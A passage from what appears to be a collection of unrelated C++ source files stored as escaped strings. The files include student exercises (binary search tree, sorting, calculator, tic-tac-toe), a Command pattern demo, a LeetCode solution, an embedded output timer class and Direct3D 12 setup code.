inputLength - leftIndex));\n}\nstd::string find_command(std::vector<std::string> pathDirectories, std::string command) {\n  if (command.empty())\n    return \"\";\n\n  for (const auto &dir : pathDirectories) {\n    std::string file = dir;\n    if (!file.empty() && file.back() != '/') {\n      file += '/';\n    }\n    file += command;\n\n    struct stat sb;\n    if (stat(file.c_str(), &sb) == 0 && !(sb.st_mode & S_IFDIR))\n      return file;\n  }\n\n  return \"\";\n}\nbool valid_directory(std::string path) {\n  struct stat sb;\n  if (stat(path.c_str(), &sb) == 0)\n    return true;\n  return false;\n}\n",
    "/*Beginning with an empty binary search tree, Construct binary search tree by inserting the\nvalues in the order given. After constructing a binary tree -\ni.Insert new node\nii. Find number of nodes in longest path\niii. Minimum data value found in the tree\niv.Mirror\nv. Search a value*/\n\n#include<iostream>\n#include<math.h>\n#include<stack>\nusing namespace std;\nclass node{\n\tpublic:\n\t\tint data;\n\t    node *left,*right;\n};\nclass bst\n{\n\tpublic:\n\t\tnode *root;\n\t\t\n\t\tbst()\n\t\t{\n\t\t\troot=NULL;\n\t\t}\n\t\tvoid create();\n\t\tvoid insert();\n\t\tvoid inorder(node *);\n\t\tint max_no_node(node *);\n\t\tint min_data(node *);\n\t\tint max_data(node *);\n\t\tvoid mirror(node *);\n\t\tvoid search(int);\n\t\tvoid non_rec_inorder(node *);\n\t\tvoid non_rec_preorder(node *root);\n\t\t\n};\n\nvoid bst::create()\n{\n\troot=new node;\n\troot->left=root->right=NULL;\n\tcout<<\"enter the data of root:\";\n\tcin>>root->data;\n}\nvoid bst::insert()\n{\n\tnode *temp,*p;\n\tif(root==NULL)\n\t{\n\t\tcreate();\n\t}\n\telse\n\t{\n\t\tp=new node;\n\t\tp->left=p->right=NULL;\n\t\tcout<<\"enter the data to be inserted==>\";\n\t\tcin>>p->data;\n\t\ttemp=root;\n\t\twhile(temp!=NULL)\n\t\t{\n\t\t\tif(p->data>temp->data)\n\t\t\t{\n\t\t\t\tif(temp->right==NULL)\n\t\t\t\t{\n\t\t\t\t\ttemp->right=p;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\ttemp=temp->right;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if(p->data<temp->data)\n\t\t\t{\n\t\t\t\tif(temp->left==NULL)\n\t\t\t\t{\n\t\t\t\t\ttemp->left=p;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\ttemp=temp->left;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout<<\"node is already inserted..!\";\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid bst::inorder(node *root)\n{\n\tif(root!=NULL)\n\t{\n\t\tinorder(root->left);\n\t\tcout<<root->data<<\" \";\n\t\tinorder(root->right);\n\t}\n}\n\nclass stack1\n{\n    node *data[30];\n    int top;\n\npublic:\n    stack1()\n    {\n        top = -1;\n    }\n    bool empty()\n    {\n        if (top == -1)\n            return true;\n        return false;\n    }\n    void push(node *p)\n    {\n        data[++top] = p;\n    }\n    node *pop()\n    {\n        return (data[top--]);\n    }\n};\n\nvoid bst::non_rec_inorder(node *root)\n{\n\tstack1 s1;\n\tnode *temp=root;\n\t\n\tdo{\n\t\twhile(temp!=NULL)\n\t\t{\n\t\t\ts1.push(temp);\n\t\t\ttemp=temp->left;\n\t\t}\n\t\tif(s1.empty())\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t\n\t\ttemp=s1.pop();\n\t\tcout<<temp->data<<\" \" ;\n\t\ttemp=temp->right;\n\t}while(1);\n}\nvoid bst::non_rec_preorder(node *root)\n{\n\t//stack<node*>s1;\n\tstack1 s1;\n\tnode *temp=root;\n\t\n\tdo{\n\t\twhile(temp!=NULL)\n\t\t{\n\t\t\tcout<<temp->data<<\" \";\n\t\t\ts1.push(temp);\n\t\t\ttemp=temp->left;\n\t\t}\n\t\tif(s1.empty())\n\t\t{\n\t\t\treturn;\n\t\t}\n\t\n\t\ttemp=s1.pop();\n\t\ttemp=temp->right;\n\t}while(1);\n}\nint bst::max_no_node(node *root)\n{\n\tint hl,hr,height;\n    if(root==NULL)\n    {\n        return 0;\n    }\n    \n    else{\n    hl=max_no_node(root->left);\n    hr=max_no_node(root->right);\n    }\n    if(hr>hl)\n    {\n        height=hr+1;\n    }\n    else\n    {\n        height=hl+1;\n    }\n    return (pow(2,height)-1);\n    \n}\n\t\nint bst::min_data(node *root)\n{\n\tif(root==NULL)\n\t{\n\t\treturn 0;\n\t}\n\telse if(root->left==NULL)\n\t{\n\t\treturn (root->data);\n\t}\n\telse\n\t{\n\t\treturn min_data(root->left);\n\t}\n}\nint bst::max_data(node *root)\n{\n\tif(root==NULL)\n\t{\n\t\treturn 0;\n\t}\n\telse if(root->right==NULL)\n\t{\n\t\treturn (root->data);\n\t}\n\telse \n\t{\n\t\treturn max_data(root->right);\n\t}\n}\n\nvoid bst::mirror(node *root)\n{\n\tnode *temp;\n\tif(root!=NULL)\n\t{\n\t\ttemp=root->left;\n\t\troot->left=root->right;\n\t\troot->right=temp;\n\t\tmirror(root->left);\n\t\tmirror(root->right);\t\n\t}\n}\nvoid bst::search(int key)\n{\n\tnode *temp=root;\n\tint count=0;\n\tif(temp==NULL)\n\t{\n\t\tcout<<\"empty...!\";\n\t\t\n\t}\n\twhile(temp!=NULL)\n\t{\n\t\tif(temp->data==key)\n\t\t{\n\t\t\tcount++;\n\t\t\tbreak;\n\t\t}\n\t\telse if(key<temp->data)\n\t\t{\n\t\t\ttemp=temp->left;\n\t\t\tcount++;\n\t\t}\n\t\telse\n\t\t{\n\t\t\ttemp=temp->right;\n\t\t\tcount++;\t\n\t\t}\n\t\t\n\t}\n\tif(temp==NULL)\n\t{\n\t\tcout<<\"\\n--------element not found-------\\n\";\n\t}\n\telse\n\t{\n\t\tcout<<\"\\n--------element found-----------\\n\";\n\t\t cout << \"\\nNo of comparisons required are: \" << count << endl;\n\t}\n}\n\nint main()\n{\n\tbst obj;\n\tint ch,key;\n\tdo{\n\t\t\n\t\tcout<<\"\\n\\n1]insert node \"<<endl\n\t\t\t\t<<\"2]max no of nodes in a tree\"<<endl\n\t\t\t\t<<\"3]value of min node from tree\"<<endl\n\t\t\t\t<<\"4] value of max node from tree\"<<endl\n\t\t\t\t<<\"5]search for a node\"<<endl\n\t\t\t\t<<\"6]mirror of tree:\"<<endl\n\t\t\t\t<<\"7]display\"<<endl\n\t\t\t\t<<\"8]display with non_recursive inorder:\"<<endl\n\t\t\t\t<<\"9]display with non_recursive preorder:\"<<endl\n\t\t\t\t<<\"0]exit\"<<endl;\n\t\tcout<<\"enter ch:\";\n\t\tcin>>ch;\n\t\t\t\tswitch(ch)\n\t\t\t\t{\n\t\t\t\t\tcase 1:obj.insert();\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 2:cout<<\"max no of nodes:\"<<obj.max_no_node(obj.root);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 3:cout<<\"min data:\"<<obj.min_data(obj.root);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 4:cout<<\"Max data:\"<<obj.max_data(obj.root);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 5:cout<<\"enter the key that uh want to search==>\";\n\t\t\t\t\t \t\tcin>>key;\n\t\t\t\t\t \t\tobj.search(key);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t    case 6:obj.mirror(obj.root);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 7:obj.inorder(obj.root);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 8:obj.non_rec_inorder(obj.root);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 9:obj.non_rec_preorder(obj.root);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\twhile(ch!=0);\n\treturn 0;\n}\n\n",
    "#include <iostream>\n#include <cmath>\n#include <windows.h>\n\nusing namespace std;\n\ndouble pi = (22/7);\n\nint sum(int x,int y){\n    return x + y;\n}\nint sub(int x,int y){\n    return x - y;\n}\nint mul(int x,int y){\n    return x * y;\n}\nint diva(int x,int y){\n    return x / y;\n}\ndouble sinn(double x){\n    double y = (x *(pi/180));\n    return sin(y);\n}\ndouble coss(double x){\n    double y = (x *(pi/180));\n    return cos(y);\n}\ndouble tann(double x){\n    double y = (x *(pi/180));\n    return tan(y);\n}\n\nint main()\n{\n    int a,c,test;\n    char b;\n    cout <<\"Enter system : \\n\"<<\"1- Basic operations(+ - * /)\\n\"<<\"2- Trigonometric operations\\n\";\n    cin >>test;\n    system(\"cls\");\n    if(test==1){\n        cin>>a>>b>>c;\n        system(\"cls\");\n        if(b=='+'){\n     cout<<\"The result is : \"<<sum(a,c);\n    }\n    else if(b=='-'){\n     cout<<\"The result is : \"<<sub(a,c);\n    }\n    else if(b=='*'){\n     cout<<\"The result is : \"<<mul(a,c);\n    }\n    else if(b=='/'){\n     cout<<\"The result is : \"<<diva(a,c);\n    }\n    else{\n        cout<<\"Error!\\n\";\n       }\n\n    }\n    if(test==2){\n       cout <<\"choose : \\n\"<<\"(1) sin(x)\\n\"<<\"(2) cos(x)\\n\"<<\"(3) tan(x)\\n\";\n       int t;\n       double angle;\n       cin>>t;\n       system(\"cls\");\n       if(t==1){\n        cout<<\"sin \";\n        cin>>angle;\n        system(\"cls\");\n        cout<< sinn(angle);\n       }\n       else if(t==2){\n        cout<<\"cos \";\n        cin>>angle;\n        system(\"cls\");\n        cout<< coss(angle);\n\n       }\n       else if(t==3){\n        cout<<\"tan \";\n        cin>>angle;\n        system(\"cls\");\n        cout<< tann(angle);\n\n       }\n       else{\n        cout<<\"Error!\\n\";\n       }\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <string>\n\n\n/*\n* \u628a\u547d\u4ee4\u4f20\u5165\u5230\u8c03\u7528\u8005\u91cc\u9762\uff0c\u7136\u540e\u8c03\u7528\u8005\u8c03\u7528\u8fd9\u4e2a\u547d\u4ee4\uff0c\u8c03\u7528\u8005\u4f7f\u7528\u5185\u90e8\u7684\u6210\u5458\u53d8\u91cf\u627f\u8f7d\u53d8\u91cf\uff0c\u6240\u4ee5\n* \u53ef\u4ee5\u76f4\u63a5\u5728\u8c03\u7528\u8005\u5185\u90e8\u8c03\u7528\n\n* \u4e00\u4e2a\u53d1\u9001\u8005\uff0c \u4e00\u4e2a\u63a5\u53d7\u8005\uff0c \u53d1\u9001\u8005\u9700\u8981\u6709\u547d\u4ee4\u7684\u6210\u5458\u53d8\u91cf\uff0c\u7136\u540e\u8c03\u7528\u8005\u8c03\u7528\u8fd9\u4e2a\u547d\u4ee4\uff0c\u547d\u4ee4\n* \u5185\u90e8\u8c03\u7528\u63a5\u53d7\u8005\u7684\u65b9\u6cd5\uff0c\u547d\u4ee4\u53ea\u6709\u4e00\u4e2a\u6267\u884c\u63a5\u53e3\uff0c\u5177\u4f53\u7684\u6267\u884c\u547d\u4ee4\u8981\u5728\u5916\u90e8\u8fdb\u884c\u58f0\u660e\n*/\n/**\n * The Command interface declares a method for executing a command.\n */\nclass Command {\n public:\n  virtual ~Command() {\n  }\n  virtual void Execute() const = 0;\n};\n/**\n * Some commands can implement simple operations on their own.\n */\nclass SimpleCommand : public Command {\n private:\n  std::string pay_load_;\n\n public:\n  explicit SimpleCommand(std::string pay_load) : pay_load_(pay_load) {\n  }\n  void Execute() const override {\n    std::cout << \"SimpleCommand: See, I can do simple things like printing (\" << this->pay_load_ << \")\\n\";\n  }\n};\n\n/**\n * The Receiver classes contain some important business logic. They know how to\n * perform all kinds of operations, associated with carrying out a request. In\n * fact, any class may serve as a Receiver.\n */\nclass Receiver {\n public:\n  void DoSomething(const std::string &a) {\n    std::cout << \"Receiver: Working on (\" << a << \".)\\n\";\n  }\n  void DoSomethingElse(const std::string &b) {\n    std::cout << \"Receiver: Also working on (\" << b << \".)\\n\";\n  }\n};\n\n/**\n * However, some commands can delegate more complex operations to other objects,\n * called \"receivers.\"\n */\nclass ComplexCommand : public Command {\n  /**\n   * @var Receiver\n   */\n private:\n  /**\n   * @brief       \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528unordered_map\u53bb\u89e3\u91ca\u63a5\u53d7\u6240\u6709\u7684\u547d\u4ee4\u53c2\u6570\uff0c\u7136\u540e\u5c06\u5176\u6620\u5c04\u5230\n   *              \u67d0\u4e2a\u5177\u4f53\u7684receiver\u4e0a\u53bb\u6267\u884c\uff0c\n   *\n   */\n\n  Receiver *receiver_;\n  /**\n   * Context data, required for launching the receiver's methods.\n   */\n  std::string a_;\n  std::string b_;\n  /**\n   * Complex commands can accept one or several receiver objects along with any\n   * context data via the constructor.\n   */\n public:\n  ComplexCommand(Receiver *receiver, std::string a, std::string b) : receiver_(receiver), a_(a), b_(b) {\n  }\n  /**\n   * Commands can delegate to any methods of a receiver.\n   */\n  void Execute() const override {\n    std::cout << \"ComplexCommand: Complex stuff should be done by a receiver object.\\n\";\n    this->receiver_->DoSomething(this->a_);\n    this->receiver_->DoSomethingElse(this->b_);\n  }\n};\n\n/**\n * The Invoker is associated with one or several commands. It sends a request to\n * the command.\n */\nclass Invoker {\n  /**\n   * @var Command\n   */\n private:\n  Command *on_start_;\n  /**\n   * @var Command\n   */\n  Command *on_finish_;\n  /**\n   * Initialize commands.\n   */\n public:\n  ~Invoker() {\n    delete on_start_;\n    delete on_finish_;\n  }\n\n  void SetOnStart(Command *command) {\n    this->on_start_ = command;\n  }\n  void SetOnFinish(Command *command) {\n    this->on_finish_ = command;\n  }\n  /**\n   * The Invoker does not depend on concrete command or receiver classes. The\n   * Invoker passes a request to a receiver indirectly, by executing a command.\n   */\n  void DoSomethingImportant() {\n    std::cout << \"Invoker: Does anybody want something done before I begin?\\n\";\n    if (this->on_start_) {\n      this->on_start_->Execute();\n    }\n    std::cout << \"Invoker: ...doing something really important...\\n\";\n    std::cout << \"Invoker: Does anybody want something done after I finish?\\n\";\n    if (this->on_finish_) {\n      this->on_finish_->Execute();\n    }\n  }\n};\n/**\n * The client code can parameterize an invoker with any commands.\n */\n\nint main() {\n  Invoker *invoker = new Invoker;\n  invoker->SetOnStart(new SimpleCommand(\"Say Hi!\"));\n  Receiver *receiver = new Receiver;\n  invoker->SetOnFinish(new ComplexCommand(receiver, \"Send email\", \"Save report\"));\n  invoker->DoSomethingImportant();\n  // Ensure the invoker and receiver are released\n  delete invoker;\n  delete receiver;\n\n  return 0;\n}\n",
    "//Estudiante: Cifuentes Gonz\u00e1lez Elian\r\n//Fecha de entrega: 03/07/2024\r\n//Curso: 1ro de TI\r\n\r\n//1) Dise\u00f1e la funci\u00f3n que ordene un vector usando el algoritmo de ordenaci\u00f3n secuencial\r\n\r\n#include<iostream>\r\n#include<time.h>\r\n#include<cstdlib>\r\n\r\nusing namespace std;\r\n\r\n// Funci\u00f3n para ordenar un vector usando el algoritmo de ordenaci\u00f3n secuencial\r\nvoid OrdenSecuencial(int x[], int total){\r\n    for (int k = 0; k < total; k++)\r\n    {\r\n        for (int j=k+1; j < total; j++)\r\n        {\r\n            if (x[k] > x[j])\r\n            {\r\n             int aux = x[k];\r\n             x[k] = x[j];\r\n             x[j] = aux;\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n// Funci\u00f3n para imprimir el contenido de un vector\r\nvoid ImprimeVector(int x[], int total){\r\n    for (int k = 0; k < total; k++)\r\n    {\r\n        cout<<endl<<x[k];\r\n    }\r\n}\r\n\r\nint main(){\r\n\r\n    const int MAX = 10; \r\n    int x[] = {15, 3, 7, 9, 2, 4, 6, 8, 10, 1};    \r\n\r\n    cout<<endl<<\"Vector Original\";\r\n    ImprimeVector(x, MAX); \r\n    \r\n    cout<<endl<<endl<<\"Vector Ordenado\";\r\n    OrdenSecuencial(x, MAX);\r\n    ImprimeVector(x, MAX); \r\n\r\n    return 0;\r\n}",
    "#include \"GenericOutput.h\"\n\nvoid GenericOutput::on()\n{\n    if (_state) return;\n    if (_pOnDelay > 0 && _pState != stdGenericOutput::ON)\n    {\n        _pState = stdGenericOutput::WAIT_FOR_ON;\n        _ticker.detach();\n        _ticker.once_ms(_pOnDelay, _onTick, this);\n        return;\n    }\n    _pState = stdGenericOutput::ON;\n    GenericOutputBase::on();\n    if (_autoOffEnabled && _duration > 0)\n    {\n        _ticker.detach();\n        _ticker.once_ms(_duration, _onTick, this);\n    }\n}\n\nvoid GenericOutput::on(uint32_t duration) {\n    _pState = stdGenericOutput::ON;\n    GenericOutputBase::on();\n    if (_autoOffEnabled)\n    {\n        _ticker.detach();\n        _ticker.once_ms(duration, _onTick, this);\n    }\n}\n\nvoid GenericOutput::onPercentage(uint8_t percentage) {\n    if (percentage < 1 || percentage > 100) return;\n    on(_duration * percentage / 100);\n}\n\nvoid GenericOutput::off()\n{\n    if (!_state) return;\n    _pState = stdGenericOutput::OFF;\n    GenericOutputBase::off();\n    _ticker.detach();\n}\n\nvoid GenericOutput::setPowerOnDelay(uint32_t delay)\n{\n    _pOnDelay = delay;\n}\n\nvoid GenericOutput::setAutoOff(bool autoOffEnabled) {\n    _autoOffEnabled = autoOffEnabled;\n}\n\nvoid GenericOutput::setAutoOff(bool autoOffEnabled, uint32_t duration) {\n    _autoOffEnabled = autoOffEnabled;\n    _duration = duration;\n}\n\nvoid GenericOutput::setDuration(uint32_t duration)\n{\n    _duration = duration;\n    if (duration > 0)\n        _autoOffEnabled = true;\n    else\n        _autoOffEnabled = false;\n}\n\nuint32_t GenericOutput::getDuration() const\n{\n    return _duration;\n}\n\nuint32_t GenericOutput::getPowerOnDelay() const {\n    return _pOnDelay;\n}",
    "//\u4f60\u6709\u4e00\u4e2a\u4e0b\u6807\u4ece 0 \u5f00\u59cb\u3001\u957f\u5ea6\u4e3a \u5076\u6570 \u7684\u6574\u6570\u6570\u7ec4 nums \uff0c\u540c\u65f6\u8fd8\u6709\u4e00\u4e2a\u7a7a\u6570\u7ec4 arr \u3002Alice \u548c Bob \u51b3\u5b9a\u73a9\u4e00\u4e2a\u6e38\u620f\uff0c\u6e38\u620f\u4e2d\u6bcf\u4e00\u8f6e \n//Alice \u548c Bob \u90fd\u4f1a\u5404\u81ea\u6267\u884c\u4e00\u6b21\u64cd\u4f5c\u3002\u6e38\u620f\u89c4\u5219\u5982\u4e0b\uff1a \n//\n// \n// \u6bcf\u4e00\u8f6e\uff0cAlice \u5148\u4ece nums \u4e2d\u79fb\u9664\u4e00\u4e2a \u6700\u5c0f \u5143\u7d20\uff0c\u7136\u540e Bob \u6267\u884c\u540c\u6837\u7684\u64cd\u4f5c\u3002 \n// \u63a5\u7740\uff0cBob \u4f1a\u5c06\u79fb\u9664\u7684\u5143\u7d20\u6dfb\u52a0\u5230\u6570\u7ec4 arr \u4e2d\uff0c\u7136\u540e Alice \u4e5f\u6267\u884c\u540c\u6837\u7684\u64cd\u4f5c\u3002 \n// \u6e38\u620f\u6301\u7eed\u8fdb\u884c\uff0c\u76f4\u5230 nums \u53d8\u4e3a\u7a7a\u3002 \n// \n//\n// \u8fd4\u56de\u7ed3\u679c\u6570\u7ec4 arr \u3002 \n//\n// \n//\n// \u793a\u4f8b 1\uff1a \n//\n// \n//\u8f93\u5165\uff1anums = [5,4,2,3]\n//\u8f93\u51fa\uff1a[3,2,5,4]\n//\u89e3\u91ca\uff1a\u7b2c\u4e00\u8f6e\uff0cAlice \u5148\u79fb\u9664 2 \uff0c\u7136\u540e Bob \u79fb\u9664 3 \u3002\u7136\u540e Bob \u5148\u5c06 3 \u6dfb\u52a0\u5230 arr \u4e2d\uff0c\u63a5\u7740 Alice \u518d\u5c06 2 \u6dfb\u52a0\u5230 arr \u4e2d\n//\u3002\u4e8e\u662f arr = [3,2] \u3002\n//\u7b2c\u4e8c\u8f6e\u5f00\u59cb\u65f6\uff0cnums = [5,4] \u3002Alice \u5148\u79fb\u9664 4 \uff0c\u7136\u540e Bob \u79fb\u9664 5 \u3002\u63a5\u7740\u4ed6\u4eec\u90fd\u5c06\u5143\u7d20\u6dfb\u52a0\u5230 arr \u4e2d\uff0carr \u53d8\u4e3a [3,2,5\n//,4] \u3002\n// \n//\n// \u793a\u4f8b 2\uff1a \n//\n// \n//\u8f93\u5165\uff1anums = [2,5]\n//\u8f93\u51fa\uff1a[5,2]\n//\u89e3\u91ca\uff1a\u7b2c\u4e00\u8f6e\uff0cAlice \u5148\u79fb\u9664 2 \uff0c\u7136\u540e Bob \u79fb\u9664 5 \u3002\u7136\u540e Bob \u5148\u5c06 5 \u6dfb\u52a0\u5230 arr \u4e2d\uff0c\u63a5\u7740 Alice \u518d\u5c06 2 \u6dfb\u52a0\u5230 arr \u4e2d\n//\u3002\u4e8e\u662f arr = [5,2] \u3002\n// \n//\n// \n//\n// \u63d0\u793a\uff1a \n//\n// \n// 1 <= nums.length <= 100 \n// 1 <= nums[i] <= 100 \n// nums.length % 2 == 0 \n// \n//\n// Related Topics \u6570\u7ec4 \u6392\u5e8f \u6a21\u62df \u5806\uff08\u4f18\u5148\u961f\u5217\uff09 \ud83d\udc4d 10 \ud83d\udc4e 0\n\n\n#include<bits/stdc++.h>\n\nusing namespace std;\n\n//leetcode submit region begin(Prohibit modification and deletion)\nclass Solution {\npublic:\n    vector<int> numberGame(vector<int>& nums) {\n        sort(nums.begin(),nums.end());\n        vector<int> ans;\n        for(int i = 0; i < nums.size(); i+=2) {\n            ans.push_back(nums[i+1]);\n            ans.push_back(nums[i]);\n        }\n        return ans;\n    }\n};\n//leetcode submit region end(Prohibit modification and deletion)\n\n\nint main() {\n    Solution s;\n    return 0;\n}",
    "#include \"aiv.h\"\n\n#include <thread>\n#include <shared_mutex>\n\n\n#include <math.h>\n#define radians(degrees) ((degrees) * M_PI / 180.0)\n\nstd::shared_mutex render_lock;\n\nvoid presenter(IDXGIFactory2* factory2, ID3D12Device2* device, ID3D12Resource* target)\n{\n\taiv::Context ctx = {};\n\n\tctx.device = device;\n\n\tD3D12_COMMAND_QUEUE_DESC queue_desc = {};\n\tqueue_desc.Type = D3D12_COMMAND_LIST_TYPE_DIRECT;\n\tCOMCHECK(ctx.device->CreateCommandQueue(&queue_desc, COMPTR(ctx.queue)));\n\n\tCOMCHECK(ctx.device->CreateFence(0, D3D12_FENCE_FLAG_NONE, COMPTR(ctx.fence)));\n\n\tctx.fence_event = CreateEvent(NULL, FALSE, FALSE, NULL);\n\n\tCOMCHECK(ctx.device->CreateCommandAllocator(D3D12_COMMAND_LIST_TYPE_DIRECT, COMPTR(ctx.command_allocator)));\n\n\tCOMCHECK(ctx.device->CreateCommandList(0, D3D12_COMMAND_LIST_TYPE_DIRECT, ctx.command_allocator, nullptr, COMPTR(ctx.command_list)));\n\n\tctx.command_list->Close();\n\n\tSDL_Window* window = SDL_CreateWindow(\"DirectX12\", 100, 100, 512, 512, 0);\n\n\tSDL_SysWMinfo wm_info;\n\tSDL_VERSION(&wm_info.version);\n\n\tSDL_GetWindowWMInfo(window, &wm_info);\n\n\tDXGI_SWAP_CHAIN_DESC1 swap_chain_desc1 = {};\n\tswap_chain_desc1.Width = 512;\n\tswap_chain_desc1.Height = 512;\n\tswap_chain_desc1.Format = DXGI_FORMAT_B8G8R8A8_UNORM;\n\tswap_chain_desc1.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\n\tswap_chain_desc1.BufferCount = 3;\n\tswap_chain_desc1.Scaling = DXGI_SCALING_STRETCH;\n\tswap_chain_desc1.SwapEffect = DXGI_SWAP_EFFECT_FLIP_DISCARD;\n\tswap_chain_desc1.SampleDesc.Count = 1;\n\tswap_chain_desc1.AlphaMode = DXGI_ALPHA_MODE_IGNORE;\n\n\tIDXGISwapChain3* swap_chain = nullptr;\n\tCOMCHECK(factory2->CreateSwapChainForHwnd(ctx.queue, wm_info.info.win.window, &swap_chain_desc1, nullptr, nullptr, (IDXGISwapChain1**)&swap_chain));\n\n\tfor (;;)\n\t{\n\t\tSDL_Event _event;\n\t\twhile (SDL_PollEvent(&_event))\n\t\t{\n\n\t\t}\n\n\t\tID3D12Resource* current_back_buffer = nullptr;\n\t\tswap_chain->GetBuffer(swap_chain->GetCurrentBackBufferIndex(), COMPTR(current_back_buffer));\n\n\t\trender_lock.lock_shared();\n\n\t\taiv::copy_resource(ctx, target, current_back_buffer,\n\t\t\tD3D12_RESOURCE_STATE_RENDER_TARGET, D3D12_RESOURCE_STATE_COPY_SOURCE, D3D12_RESOURCE_STATE_PRESENT, D3D12_RESOURCE_STATE_COPY_DEST);\n\n\t\trender_lock.unlock_shared();\n\n\t\tswap_chain->Present(1, 0);\n\t}\n}\n\nint main(int argc, char** argv)\n{\n\n\taiv::Context ctx = {};\n\n\tIDXGIFactory* factory = nullptr;\n\tCOMCHECK(CreateDXGIFactory2(DXGI_CREATE_FACTORY_DEBUG, COMPTR(factory)));\n\n\tIDXGIFactory2* factory2 = nullptr;\n\tCOMCHECK(factory->QueryInterface<IDXGIFactory2>(&factory2));\n\n\tUINT adapter_index = 0;\n\tIDXGIAdapter1* adapter = nullptr;\n\tstd::vector<IDXGIAdapter1*> adapters;\n\tfor (;;)\n\t{\n\t\tadapter = nullptr;\n\t\tif (factory2->EnumAdapters1(adapter_index, &adapter) != S_OK)\n\t\t{\n\t\t\tbreak;\n\t\t}\n\n\t\tadapters.push_back(adapter);\n\n\t\tadapter_index++;\n\t}\n\n\tfor (IDXGIAdapter1* current_adapter : adapters)\n\t{\n\t\tDXGI_ADAPTER_DESC1 adapter_desc;\n\t\tcurrent_adapter->GetDesc1(&adapter_desc);\n\t\tstd::wcout << adapter_desc.Description << \" \" << adapter_desc.DedicatedVideoMemory / 1024 / 1024 << std::endl;\n\t}\n\n\tIDXGIAdapter1* best_adapter = adapters[1];\n\n\tID3D12Debug* debug = nullptr;\n\tD3D12GetDebugInterface(COMPTR(debug));\n\tdebug->EnableDebugLayer();\n\n\tCOMCHECK(D3D12CreateDevice(best_adapter, D3D_FEATURE_LEVEL_12_0, COMPTR(ctx.device)));\n\n\tstd::cout << \"Number of GPU nodes: \" << ctx.device->GetNodeCount() << std::endl;\n\n\tD3D12_COMMAND_QUEUE_DESC queue_desc = {};\n\tqueue_desc.Type = D3D12_COMMAND_LIST_TYPE_DIRECT;\n\tCOMCHECK(ctx.device->CreateCommandQueue(&queue_desc, COMPTR(ctx.queue)));\n\n\tCOMCHECK(ctx.device->CreateFence(0, D3D12_FENCE_FLAG_NONE, COMPTR(ctx.fence)));\n\n\tctx.fence_event = CreateEvent(NULL, FALSE, FALSE, NULL);\n\n\tCOMCHECK(ctx.device->CreateCommandAllocator(D3D12_COMMAND_LIST_TYPE_DIRECT, COMPTR(ctx.command_allocator)));\n\n\tCOMCHECK(ctx.device->CreateCommandList(0, D3D12_COMMAND_LIST_TYPE_DIRECT, ctx.command_allocator, nullptr, COMPTR(ctx.command_list)));\n\n\tctx.command_list->Close();\n\n\tstd::vector<D3D12_DESCRIPTOR_RANGE1> ranges;\n\n\tD3D12_DESCRIPTOR_RANGE1 range0 = {};\n\trange0.RangeType = D3D12_DESCRIPTOR_RANGE_TYPE_SRV;\n\trange0.NumDescriptors = 7; // t0 - t6\n\trange0.OffsetInDescriptorsFromTableStart = D3D12_DESCRIPTOR_RANGE_OFFSET_APPEND;\n\n\tranges.push_back(range0);\n\n\tstd::vector<D3D12_DESCRIPTOR_RANGE1> ranges2;\n\tD3D12_DESCRIPTOR_RANGE1 range1 = {};\n\trange1.RangeType = D3D12_DESCRIPTOR_RANGE_TYPE_SAMPLER;\n\trange1.NumDescriptors = 1; // s0\n\trange1.OffsetInDescriptorsFromTableStart = D3D12_DESCRIPTOR_RANGE_OFFSET_APPEND;\n\n\tranges2.push_back(range1);\n\n\tstd::vector<D3D12_ROOT_PARAMETER1> params;\n\n\tD3D12_ROOT_PARAMETER1 param0 = {};\n\tparam0.ParameterType = D3D12_ROOT_PARAMETER_TYPE_DESCRIPTOR_TABLE;\n\tparam0.DescriptorTable.NumDescriptorRanges = ranges.size();\n\tparam0.DescriptorTable.pDescriptorRanges = ranges.data();\n\tparams.push_back(param0);\n\n\tD3D12_ROOT_PARAMETER1 param1 = {};\n\tparam1.ParameterType = D3D12_ROOT_PARAMETER_TYPE_32BIT_CONSTANTS;\n\tparam1.Constants.Num32BitValues = 16 + 16 + 16 + 1;\n\tparams.push_back(param1);\n\n\tD3D12_ROOT_PAR",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nconst int SIZE = 3;\r\nchar board[SIZE][SIZE] = {{'1', '2', '3'}, {'4', '5', '6'}, {'7', '8', '9'}};\r\nchar current_marker;\r\nint current_player;\r\n\r\nvoid drawBoard() {\r\n    cout << \"-------------\" << endl;\r\n    for (int i = 0; i < SIZE; ++i) {\r\n        cout << \"| \";\r\n        for (int j = 0; j < SIZE; ++j) {\r\n            cout << board[i][j] << \" | \";\r\n        }\r\n        cout << endl << \"-------------\" << endl;\r\n    }\r\n}\r\n\r\nbool placeMarker(int slot) {\r\n    int row = (slot - 1) / SIZE;\r\n    int col = (slot - 1) % SIZE;\r\n\r\n    if (board[row][col] != 'X' && board[row][col] != 'O') {\r\n        board[row][col] = current_marker;\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n\r\nint winner() {\r\n    // Check rows\r\n    for (int i = 0; i < SIZE; ++i) {\r\n        if (board[i][0] == board[i][1] && board[i][1] == board[i][2]) {\r\n            return current_player;\r\n        }\r\n    }\r\n\r\n    // Check columns\r\n    for (int i = 0; i < SIZE; ++i) {\r\n        if (board[0][i] == board[1][i] && board[1][i] == board[2][i]) {\r\n            return current_player;\r\n        }\r\n    }\r\n\r\n    // Check diagonals\r\n    if (board[0][0] == 